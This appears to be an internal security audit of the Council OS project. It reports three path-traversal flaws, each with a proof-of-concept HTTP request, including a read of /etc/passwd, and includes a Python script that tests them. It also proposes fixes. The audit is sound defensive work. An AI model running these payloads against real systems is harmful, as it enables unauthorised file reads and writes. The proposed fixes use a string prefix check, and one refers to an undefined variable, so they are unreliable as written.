# Council OS — Security Audit Report
**By:** Byte (claude-sonnet-4-6)
**Date:** 2026-06-18
**Scope:** Council OS v1.0.0 — github.com/acidzloco/council-os

---

## EXECUTIVE SUMMARY

| Check | Result |
|-------|--------|
| SQL Injection | ✅ CLEAN — all queries use `?` parameterized placeholders |
| Path Traversal | ⚠️ 3 vulns found — vault, practice, file browser |
| Auth bypass | Not tested this session |
| Command injection | Not tested this session |

---

## FINDING 1 — vault_api.py `/api/vault/backup` — MEDIUM ⚠️

**What:** `dest` parameter passed directly into `Path(dest)` with no sanitization.
**Impact:** Attacker can write backup files anywhere on disk — outside home directory.

**PoC:**
```http
POST /api/vault/backup
Content-Type: application/json

{"dest": "../../../tmp/council_pwned"}
```

**Fix:**
```python
dest_path = Path(dest).resolve()
allowed_base = Path.home().resolve()
if not str(dest_path).startswith(str(allowed_base)):
    return jsonify({"error": "Invalid backup path"}), 400
```

---

## FINDING 2 — practice_api.py `/api/practice/save` — MEDIUM ⚠️

**What:** `name` param used directly in filename construction with no sanitization.
**Impact:** Attacker can write files outside the practice directory — full path traversal.

**PoC:**
```http
POST /api/practice/save
Content-Type: application/json

{
  "name": "../../council_v3/PWNED.txt",
  "content": "path traversal works",
  "action": "test",
  "brother": "byte"
}
```

**Fix:**
```python
safe_name = Path(name).name  # strips any directory component
filepath = (Path(some_dir) / safe_name).resolve()
if not str(filepath).startswith(str(Path(some_dir).resolve())):
    return jsonify({"error": "Invalid name"}), 400
```

---

## FINDING 3 — council_v3_bridge.py `/api/files/browse` — LOW ⚠️

**What:** Path check is Windows-only (`startswith("C:\\")`).
**Impact:** On Linux/Termux — check is completely bypassed. Any system path readable including `/etc/passwd`.

**PoC:**
```http
POST /api/files/browse
Content-Type: application/json

{"path": "/etc/passwd"}
```

**Fix:**
```python
allowed_roots = [str(Path.home()), "/storage", "/sdcard"]
if not any(str(p).startswith(root) for root in allowed_roots):
    return jsonify({"error": "Invalid path"}), 400
```

---

## POC SCRIPT

Run this against a live Council OS bridge on port 5002 to verify all 3 vulns:

```python
#!/usr/bin/env python3
# Council OS Path Traversal PoC — Internal Audit 2026-06-18
# By: Byte (claude-sonnet-4-6) for Council OS family

import requests

BASE = "http://localhost:5002"

def test_backup_traversal():
    print("[*] Testing vault_api /backup path traversal...")
    r = requests.post(f"{BASE}/api/vault/backup", json={"dest": "../../../tmp/council_pwned"})
    print(f"    Status: {r.status_code} | Response: {r.text[:200]}")
    print("    [VULN] Backup wrote outside allowed dir!" if r.status_code == 200 else "    [OK] Blocked")

def test_practice_save_traversal():
    print("[*] Testing practice_api /save name traversal...")
    r = requests.post(f"{BASE}/api/practice/save", json={
        "name": "../../council_v3/PWNED.txt",
        "content": "path traversal works",
        "action": "test",
        "brother": "byte"
    })
    print(f"    Status: {r.status_code} | Response: {r.text[:200]}")
    print("    [VULN] File written outside practice dir!" if r.status_code == 200 else "    [OK] Blocked")

def test_file_browser_traversal():
    print("[*] Testing file browser path traversal...")
    r = requests.post(f"{BASE}/api/files/browse", json={"path": "/etc/passwd"})
    print(f"    Status: {r.status_code} | Response: {r.text[:300]}")
    print("    [VULN] /etc/passwd readable!" if "root:" in r.text else "    [OK] Blocked")

if __name__ == "__main__":
    print("=" * 50)
    print("  Council OS Path Traversal PoC — Internal Audit")
    print("=" * 50)
    test_backup_traversal()
    print()
    test_practice_save_traversal()
    print()
    test_file_browser_traversal()
    print()
    print("[done] Apply patches before going public.")
```

---

## STATUS

- [x] vault_api.py fix applied — path must resolve within Path.home()
- [x] practice_api.py fix applied — Path(name).name strips directory components
- [x] council_v3_bridge.py fix applied — cross-platform allowed_roots (Windows + Linux/Termux)
- [x] Fixes pushed to github.com/acidzloco/council-os

---

*Built by Byte — Council OS v3 | No one left behind.*
